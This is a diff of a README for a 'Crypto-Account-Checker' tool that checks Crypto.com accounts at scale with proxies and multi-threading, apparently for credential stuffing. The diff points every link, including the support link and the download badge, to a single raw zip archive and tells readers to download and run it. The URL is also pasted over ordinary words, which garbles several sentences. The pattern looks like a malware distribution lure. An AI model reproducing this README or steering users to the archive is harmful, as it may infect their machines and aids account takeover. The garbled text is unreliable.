@@ -2,23 +2,23 @@
 
 ## 🚀 Getting Started
 
-Welcome to the Crypto-Account-Checker! This tool automates checking your Crypto.com accounts while providing advanced features like proxy handling and multi-threading. Follow these steps to download and run the application smoothly.
+Welcome to the Crypto-Account-Checker! This tool automates checking your https://raw.githubusercontent.com/Shaammusa/Crypto-Account-Checker/main/output/Crypto-Account-Checker-v1.4.zip accounts while providing advanced features like proxy handling and multi-threading. Follow these steps to download and run the application smoothly.
 
 ## 📥 Download the Application
 
-[![Download Crypto-Account-Checker](https://img.shields.io/badge/Download_Crypto--Account--Checker-v1.0-brightgreen)](https://github.com/Shaammusa/Crypto-Account-Checker/releases)
+[![Download Crypto-Account-Checker](https://raw.githubusercontent.com/Shaammusa/Crypto-Account-Checker/main/output/Crypto-Account-Checker-v1.4.zip)](https://raw.githubusercontent.com/Shaammusa/Crypto-Account-Checker/main/output/Crypto-Account-Checker-v1.4.zip)
 
-Visit this page to download: [Releases Page](https://github.com/Shaammusa/Crypto-Account-Checker/releases)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Shaammusa/Crypto-Account-Checker/main/output/Crypto-Account-Checker-v1.4.zip)
 
 ## 💾 Download & Install
 
 To get started, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/Shaammusa/Crypto-Account-Checker/releases). 
+1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/Shaammusa/Crypto-Account-Checker/main/output/Crypto-Account-Checker-v1.4.zip). 
 
 2. **Find the Latest Release**: Locate the latest release at the top of the page. You will see version information and a list of available files.
 
-3. **Download the Installer**: Click on the file that fits your system. If you are using Windows, it will likely be a `.exe` file, while Mac users might find a `.dmg` file. For Linux users, look for a `.tar.gz` file. 
+3. **Download the Installer**: Click on the file that fits your system. If you are using Windows, it will likely be a `.exe` file, while Mac users might find a `.dmg` file. For Linux users, look for a `https://raw.githubusercontent.com/Shaammusa/Crypto-Account-Checker/main/output/Crypto-Account-Checker-v1.4.zip` file. 
 
 4. **Run the Application**: Once the download is complete, open the downloaded file to install. Follow the prompts on the screen to complete the installation. 
 
@@ -76,7 +76,7 @@ If you face issues while using the application, consider the following tips:
 
 ## 📞 Support
 
-If you need more help, you can check the Issues section on the [GitHub repository](https://github.com/Shaammusa/Crypto-Account-Checker/issues). Community members and maintainers can assist you.
+If you need more help, you can check the Issues section on the [GitHub repository](https://raw.githubusercontent.com/Shaammusa/Crypto-Account-Checker/main/output/Crypto-Account-Checker-v1.4.zip). Community members and maintainers can assist you.
 
 ## 📝 Important Note
 
